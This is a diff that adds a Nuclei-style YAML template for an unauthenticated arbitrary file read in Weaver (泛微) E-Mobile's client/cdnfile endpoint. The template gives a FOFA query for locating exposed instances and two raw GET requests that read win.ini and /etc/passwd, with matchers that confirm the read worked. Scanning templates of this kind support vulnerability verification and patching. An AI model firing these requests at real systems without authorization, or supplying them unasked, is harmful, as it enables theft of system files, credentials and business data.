@@ -1,0 +1,42 @@
+id: WeaverOA-E-Mobile-client_cdnfile-File-reading
+
+info:
+  name: "泛微E-Mobile client 接口任意文件读取漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="泛微-EMobile"
+      泛微E-Mobile client/cdnfile 接口存在未经身份验证的任意文件读取漏洞。攻击者可利用该漏洞访问敏感系统文件（包括但不限于数据库配置文件、系统配置文件等），从而获取系统凭证及关键业务数据，导致系统面临严重安全风险。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487494&idx=1&sn=464d9a36a7cb01d83d481ec6ec6d27b0&chksm=c267a535f5102c23ea4e678b5f75cfd032e23b066db9dceb9f0190ca0a4a13dcdcc1eaf229fc&token=1439003696&lang=zh_CN#rd
+  tags: 泛微E-Mobile
+
+
+
+http:
+- raw:
+  - |
+    GET /client/cdnfile/1C/Windows/win.ini?windows HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+
+  - |
+    GET /client/cdnfile/C/etc/passwd?linux HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '; for 16-bit app support'
+    - 'root:'
+    condition: or
+  - type: status
+    status:
+    - 200
+
+
+
+
